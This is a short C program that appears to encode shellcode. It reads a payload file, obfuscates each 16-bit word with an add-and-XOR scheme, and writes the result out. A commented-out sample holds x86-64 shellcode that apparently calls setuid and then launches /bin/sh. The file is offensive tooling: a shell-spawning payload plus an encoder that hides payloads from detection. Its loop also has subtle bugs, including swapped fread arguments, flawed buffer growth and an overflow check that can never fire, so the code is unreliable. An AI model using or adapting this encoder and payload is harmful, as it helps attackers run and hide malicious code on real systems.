#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
// // get this code from a socket connection
// unsigned char code[] = "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
// "\x0f\x05\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x48\xbf\x2f\x62"
// "\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6"
// "\x0f\x05";

unsigned char *code;

#define ADDKEY 42
#define XORKEY 0xbeef

// a function ptr type shellcode_t that takes nothing and returns a int
typedef void* (*shellcode_t)();

int main(int argc, char ** argv) {

	if (argc < 2) {
		printf("usage: %s <shellcode file>\n", argv[0]);
		exit(1);
	}
	FILE* f = fopen(argv[1], "r");


	// --------------------- BEGIN read shell code -------------------

	code = (unsigned char*) malloc(200); //initial 200 bytes
	size_t retval = fread(code, sizeof(char), 200, f);
	size_t size = 0;
	size += retval;

	while (retval) {
		if (size > 200) {
			code = realloc(code, size + 200);
		}
		retval = fread(code, 200, sizeof(char), f);
		size += retval;
	}

	fprintf(stderr, "size of shellcode: %zu\n", size);

	//now file is loaded
	uint16_t *p;
	for (size_t i = 0; i < size / 2; i += 1) {
		p = ((uint16_t*) (code)) + i;
		*p += ADDKEY;
		if (*p > 0xffff) {
			*p %= 65535;
		}
		*p ^= XORKEY;
		
		// write(1, p, sizeof(uint16_t));
	}

	write(1, code, size);
 
    return 0;
}
